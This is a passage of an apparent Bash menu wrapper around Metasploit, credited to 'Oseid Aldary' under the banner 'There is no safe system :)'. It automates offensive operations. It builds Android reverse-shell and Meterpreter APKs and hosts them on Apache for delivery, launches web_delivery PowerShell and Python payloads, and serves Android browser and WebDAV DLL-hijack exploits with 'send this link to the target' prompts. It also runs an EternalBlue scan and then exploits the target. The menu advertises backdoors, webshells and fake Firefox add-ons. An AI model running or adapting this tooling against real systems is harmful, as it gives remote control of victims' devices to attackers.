echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [APK] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                          
echo "$BLUE PAYLOAD    $GREEN:>$RED android/meterpreter/reverse_https $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
aa=.apk
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_https LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$aa
cp $name$aa /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
 xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/meterpreter/reverse_https; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

and1s () {
clear
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [APK] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
echo "$BLUE PAYLOAD    $GREEN:>$RED android/shell/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
aa=.apk
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/shell/reverse_tcp LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$aa
cp $name$aa /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
 xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/shell/reverse_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

and2s () {
clear
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [APK] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
echo "$BLUE PAYLOAD    $GREEN:>$RED android/shell/reverse_http $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
aa=.apk
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/shell/reverse_http LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$aa
cp $name$aa /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
 xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/shell/reverse_http; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

and3s () {
clear
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [APK] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                          
echo "$BLUE PAYLOAD    $GREEN:>$RED android/shell/reverse_https $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
aa=.apk
sleep 1
xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/shell/reverse_https LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$aa
cp $name$aa /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
 xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/shell/reverse_https; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}



function android  {
clear

cat << !

$RED
                   .___             .__    .___ ___.                  __       .___                    
_____    ____    __| _/______  ____ |__| __| _/ \_ |__ _____    ____ |  | __ __| _/____   ___________  
\__  \  /    \  / __ |\_  __ \/  _ \|  |/ __ |   | __ \\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ \ 
 / __ \|   |  \/ /_/ | |  | \(  <_> )  / /_/ |   | \_\ \/ __ \\  \___|    </ /_/ (  <_> |  <_> )  | \/ 
(____  /___|  /\____ | |__|   \____/|__\____ |   |___  (____  /\___  >__|_ \____ |\____/ \____/|__|    
     \/     \/      \/                      \/       \/     \/     \/     \/    \/                     $BLUE


PAYLODS
======= 

METERPRETER
============$GREEN
1 $BLUE > android/meterpreter/reverse_tcp $GREEN
2 $BLUE > android/meterpreter/reverse_http $GREEN 
3 $BLUE > android/meterpreter/reverse_https $BLUE

SHELL
======$GREEN
4 $BLUE > android/shell/reverse_tcp $GREEN
5 $BLUE > android/shell/reverse_http $GREEN 
6 $BLUE > android/shell/reverse_https $GREEN


7 $BLUE >$RED EXIT $GREEN

!
echo "============================================================="$BLUE
echo
echo -n "choice payload :> $RED "
read pylo
case $pylo in
1)and1 ;;
2)and2 ;;
3)and3 ;;
4)and1s ;;
5)and2s ;;
6)and3s ;;
7)exie ;;
*) echo "\"$pylo\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
esac
android
}

power () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [web_delivery - [powershell] Final Config:"
echo "==================================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                                                                    
echo "$BLUE exploit    $GREEN:>$RED multi/script/web_delivery [powershell] $GREEN "              
sleep 3
echo
echo
echo $BLUE"[*]$RED:$GREEN create and Listener $RED [$BLUE web_delvery$RED [$BLUE powershell $RED] "
sleep 2
echo
echo
xterm -T " DHH - Listener [web_delivery powershell payload] " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $host; set TARGET 2; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; set URIPATH /a; exploit -j'"

echo "Done ! "

}

py () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [web_delivery - [python] Final Config:"
echo "==================================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                                                                    
echo "$BLUE exploit    $GREEN:>$RED multi/script/web_delivery [python] $GREEN "              
sleep 3
echo
echo
echo $BLUE"[*]$RED:$GREEN create and Listener $RED [$BLUE web_delvery$RED [$BLUE python $RED] "
sleep 2
echo
echo
xterm -T " DHH - Listener [web_delivery python payload] " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $host; set TARGET 0; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; set URIPATH /a; exploit -j'"

echo "Done ! "

}

 





function webdd {
clear

cat << !

$RED

          _______  ______       ______   _______  _       _________          _______  _______          
|\     /|(  ____ \(  ___ \     (  __  \ (  ____ \( \      \__   __/|\     /|(  ____ \(  ____ )|\     /|
| )   ( || (    \/| (   ) )    | (  \  )| (    \/| (         ) (   | )   ( || (    \/| (    )|( \   / )
| | _ | || (__    | (__/ /     | |   ) || (__    | |         | |   | |   | || (__    | (____)| \ (_) / 
| |( )| ||  __)   |  __ (      | |   | ||  __)   | |         | |   ( (   ) )|  __)   |     __)  \   /  
| || || || (      | (  \ \     | |   ) || (      | |         | |    \ \_/ / | (      | (\ (      ) (   
| () () || (____/\| )___) )    | (__/  )| (____/\| (____/\___) (___  \   /  | (____/\| ) \ \__   | |   
(_______)(_______/|/ \___/_____(______/ (_______/(_______/\_______/   \_/   (_______/|/   \__/   \_/  $GREEN 
                         (_____)                                                                       


1 $BLUE > powershell for [ exploit windows ] $GREEN
2 $BLUE > python for [ exploit linux ]$GREEN

3 $BLUE >$RED Exit $GREEN                                                                               

=======================================================
!
echo -n "Enter choice{1/2/3 >> : $RED "
read cho
case $cho in
1)power ;;
2)py ;;
3)exie ;;
*) echo "\"$cho\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
esac
webdd

}

andro1 () {
clear
echo
echo
echo "please wait.........."
sleep 2
clear
echo $BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo
echo -n "Enter SRVHOST=$RED"
read LHOST
echo "" $GREEN
sleep 1
echo "SRVHOST==>$BLUE $LHOST "$GREEN
echo
echo "==========================="
echo
echo -n "Enter LPORT=$RED"
read port
echo "" $GREEN
sleep 1
echo "LPORT==>$BLUE $port "$GREEN
echo
echo "==========================="
sleep 1
clear
echo
echo
echo " Final Config: "
echo "===================================="
echo "$BLUE SRVHOST    $GREEN:>$RED $LHOST $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                                                                   
echo "$BLUE exploit    $GREEN:>$RED android/browser/webview_addjavascriptinterface  $GREEN "
echo
sleep 4
echo $BLUE"[*]$RED:$GREEN create $RED [$BLUE exploit android $RED] "
sleep 2
echo
echo "$GREEN Done !"
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo "$BLUE[*]$RED:$GREEN[Send This Link To The Target Android[ http://$LHOST:8080/a ] ]" 
echo
sleep 1
echo "starting Listener  on $BLUE[ http://$LHOST:8080/a ]"
sleep 1
xterm -T "DHH - Listenner" -geometry 99x23 -e "msfconsole -x 'use exploit/android/browser/webview_addjavascriptinterface; set PAYLOAD android/meterpreter/reverse_tcp; set SRVHOST $LHOST; set LPORT $port; set LHOST $LHOST; set URIPATH /a; exploit -j'"

echo "Done !"
sleep 1

}

win1 () {
clear
echo
echo
echo "please wait.........."
sleep 2
clear
echo $BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo
echo -n "Enter SRVHOST=$RED"
read LHOST
echo "" $GREEN
sleep 1
echo "SRVHOST==>$BLUE $LHOST "$GREEN
echo
echo "==========================="
echo
echo -n "Enter LPORT=$RED"
read port
echo "" $GREEN
sleep 1
echo "LPORT==>$BLUE $port "$GREEN
echo
echo "==========================="
sleep 1
clear
echo
echo
echo " Final Config: "
echo "========================================="
echo "$BLUE SRVHOST    $GREEN:>$RED $LHOST $GREEN"
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"
echo "$BLUE exploit    $GREEN:>$RED windows/browser/webdav_dll_hijacker $GREEN"
sleep 3
echo
echo
echo $BLUE"[*]$RED:$GREEN create $RED [$BLUE exploit windows $RED] "
sleep 2
echo
echo "$GREEN Done !"
sleep 1
echo 
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo "$BLUE[*]$RED:$GREEN[Send This Link To The Target Windows[ http://$LHOST:8080/a ] ]" 
echo
sleep 1
echo "starting Listener  on $BLUE[ http://$LHOST:8080/a ]"

xterm -T "DHH - Listener " -geometry 110x23 -e "msfconsole -x 'use exploit/windows/browser/webdav_dll_hijacker; set PYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set SRVHOST $LHOST; set EXTENSIONS torrent; set LPORT $port; exploit -j'"

echo "Done !"
sleep 1

}



explo () {
clear
echo
echo
echo "please wait.........."
sleep 2
clear
echo $BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo
echo -n "Enter LHOST=$RED"
read LHOST
echo "" $GREEN
sleep 1
echo "LHOST==>$BLUE $LHOST "$GREEN
echo
echo "==========================="
echo
echo -n "Enter targetIP=$RED"
read target
echo "" $GREEN
sleep 1
echo "targetIP==>$BLUE $target "$GREEN
echo
echo "==========================="
sleep 1
clear
echo
echo
echo " Final Config: [exploit [$target]] "
echo "========================================="
echo "$BLUE LHOST      $GREEN:>$RED $LHOST $GREEN"
echo "$BLUE targetIP   $GREEN:>$RED $target $GREEN"
echo "$BLUE exploit    $GREEN:>$RED exploit/windows/smb/ms17_010_eternalblue $GREEN"
sleep 3
echo
echo
echo "$BLUE[*]$RED:$GREEN Starting exploit$RED [$target] "
sleep 1
xterm -T "DHH - exploit[$target]" -geometry 110x23 -e "msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue ; set LHOST $LHOST; set rhost $target; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j'"
echo
echo "Done!"
sleep 1
clear
otherexploit

}

bac () {
clear
otherexploit

}


function winhack {
clear
echo
echo
echo "please wait.........."
sleep 2
clear
echo
echo "" $GREEN
echo "============================"
echo
echo -n "Enter targetIP=$RED"
read target
echo "" $GREEN
sleep 1
echo "targetIP==>$BLUE $target "$GREEN
echo
echo "==========================="
sleep 1
clear
echo
echo
echo " Final Config: [scanner $target ] "
echo "========================================="
echo "$BLUE targetIP   $GREEN:>$RED $target $GREEN"
echo "$BLUE exploit    $GREEN:>$RED auxiliary/scanner/smb/smb_ms17_010 $GREEN"
sleep 3
echo
echo
echo "starting scan target$RED[$target]"
sleep 1
xterm -T "DHH -SCANNER [$target]" -geometry 110x23 -e "msfconsole -x 'use auxiliary/scanner/smb/smb_ms17_010; set rhosts $target; exploit -j'"
echo
echo "$BLUE[*]$RED:$GREEN Done"
sleep 1
clear
echo
echo "" $RED
echo " ##########################################################"
echo " ################$GREEN   Was the target infected ?$RED #############"
echo " ##########################################################"$BLUE
echo $GREEN
echo "if target infected choice 1 to $BLUE run exploit "$GREEN
echo
echo "if target not infected choice 2 to $BLUE back to menu"$GREEN
echo "======================================================== "$BLUE
echo " 1 -$RED run exploit "$BLUE
echo ""
echo " 2 -$RED back to menu "
echo ""$GREEN 
echo -n "ENTER YOUR CHOICE [1/2] : $RED"
read coi
case $coi in
1)explo ;;
2)bac ;;
*) echo "\"$coi\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
esac
winhack

}



function otherexploit {
clear
cat << !
$RED
╔═╗┌┬┐┬ ┬┌─┐┬─┐  ┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐
║ ║ │ ├─┤├┤ ├┬┘  ├┤ ┌┴┬┘├─┘│  │ ││ │ 
╚═╝ ┴ ┴ ┴└─┘┴└─  └─┘┴ └─┴  ┴─┘└─┘┴ ┴ 

$GREEN
        
1 $BLUE >[Hack android use link] $GREEN
2 $BLUE >[Hack windows use torrent file] $GREEN
3 $BLUE >[Check the Windows operating system target of the MS_17 [Eternabalu]$GREEN

4 $BLUE >$RED EXIT$GREEN   
 
!
echo "============================================"
echo
echo -n "Enter Choice >> : $RED "
read other
case $other in
1)andro1 ;;
2)win1 ;;
3)winhack ;;
4)exie ;;
*) echo "\"$other\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
esac
otherexploit

}


trap ctrl_c INT
ctrl_c() {
exie
}
 


exie () {
echo
echo "" $GREEN
echo "thanks for using"
sleep 2
echo "" $RED
echo "see you letar"
sleep 2
echo
echo "" $BLUE
echo "goodbye :) "
sleep 2
clear
exit

}


while :
do
clear
cat << !

$GREEN
------------------------------------------------------------------------$RED|
                                                                        |
╔═╗─┐ ┬┌─┐┬  ┌─┐┬┌┬┐┌─┐┌┬┐┬┌─┐┌┐┌  ┌─┐┬  ┌─┐┌┬┐┌─┐┌─┬─┐┌┬┐              |
║╣ ┌┴┬┘├─┘│  │ ││ │ ├─┤ │ ││ ││││  ├─┘│  ├─┤ │ ├┤ │ │├┬┘│││             |
╚═╝┴ └─┴  ┴─┘└─┘┴ ┴ ┴ ┴ ┴ ┴└─┘┘└┘  ┴  ┴─┘┴ ┴ ┴ └  └─┘┴└─┴ ┴             |$BLUE  
                                                                   $RED     |$BLUE
by --->$GREEN Oseid Aldary$BLUE <----$RED                                              |
                                                                        |
There is no safe system :)$RED                                              |$GREEN
                                                                        $RED|$GREEN
-------------------------Automated Exploits-----------------------------$RED|$BLUE
$BLUE                                                                       $RED |$BLUE 
  1 =>>    Windows Payloads     >>      [ Windows Payloads Menu        ]$RED|$BLUE
  2 =>>    Linux Payloads       >>      [ Linux Payloads Menu          ]$RED|$BLUE
  3 =>>    Mac osx Payload      >>      [ Apple-Mac Payload            ]$RED|$BLUE
  4 =>>    Android Backdoors    >>      [ Android Backdoors Menu       ]$RED|$BLUE
  5 =>>    Java Signed Applet   >>      [ Multi-Operative Systems      ]$RED|$BLUE
  6 =>>    Webshell[php]        >>      [ Website Backdoor Shell       ]$RED|$BLUE
  7 =>>    Winrar Backdoor      >>      [ Inject Payload Into a Winrar ]$RED|$BLUE
  8 =>>    Firefox Addition     >>      [ Fake Firefox Addition        ]$RED|$BLUE
  9 =>>    Web_Driveby          >>      [ Powershell/ ro /Pythhon      ]$RED|$BLUE
 10 =>>    other exploit        >>      [ Android // Windows           ]$RED|$BLUE
                                                                        $RED|
                            ____________________________________________|
 $GREEN                           $RED|$BLUE[*]$RED:$BLUE[Public IP ADDR: $GREEN$myip2$BLUE ]$GREEN                   
                            $RED|$BLUE[*]$RED:$BLUE[Local IP ADDR : $GREEN$myip$BLUE ]             
 E =>>   Exit               $RED|$BLUE[*]$RED:$BLUE[Interface Use : $GREEN$In$BLUE ]          
                            $RED|$BLUE[*]$RED:$BLUE[Gateway: $GREEN$GAT$BLUE ]$RED
____________________________|                        
!
echo
echo "" $RED
echo -n "[>]$GREEN:[Enter Your Choice$BLUE ->>> "$RED
read word
case $word in
1)wine ;;
2)linu ;;
3)mac ;;
4)android ;;
5)java ;;
6)web ;;
7)wiri ;;
8)fireadd ;;
9)webdd ;;
10)otherexploit ;;
e)exie ;;
E)exie ;;
*) echo "\"$word\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
esac
done

else
if [ $word = 19 ];then
clear 
function apache1  {
clear
echo
echo "[*]$RED:$BLUE START APACHE SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - start [APACHE]  " -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start Apache]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done Apache server has been started " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}

function apache2 {
clear
echo
echo "[*]$RED:$BLUE STOP APACHE SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - stop [APACHE]  " -geometry 110x23 -e "service apache2 stop"
         echo $BLUE[*]$RED:$RED[stop Apache]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done Apache server has been stoped " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}

function apache3 {
clear
echo
echo "[*]$RED:$BLUE RESTART APACHE SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - restart [APACHE]  " -geometry 110x23 -e "service apache2 restart"
         echo $BLUE[*]$RED:$RED[restart Apache]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done Apache server has been restarted " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}



function post1 {
clear
echo
echo "[*]$RED:$BLUE START POSGRESQL SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - start [Postgresql]  " -geometry 110x23 -e "service postgresql start"
         echo $BLUE[*]$RED:$RED[start Postgresql]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done Postgresql server has been started " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}

function post2 {
clear
echo
echo "[*]$RED:$BLUE STOP POSGRESQL SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - stop [Postgresql]  " -geometry 110x23 -e "service postgresql stop"
         echo $BLUE[*]$RED:$RED[stop Postgresql]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done Postgresql server has been stoped " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}

function post3 {
clear
echo
echo "[*]$RED:$BLUE RESTART POSGRESQL SERVER$RED.........."
sleep 2
echo
xterm -T "DHH - restart [Postgresql]  " -geometry 110x23 -e "service postgresql restart"
         echo $BLUE[*]$RED:$RED[restart Postgresql]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done Postgresql server has been restarted " 
echo
echo
echo "" $BLUE
read -p "Press Enter to back to the menu "
clear

}


function beef1 {
clear
echo
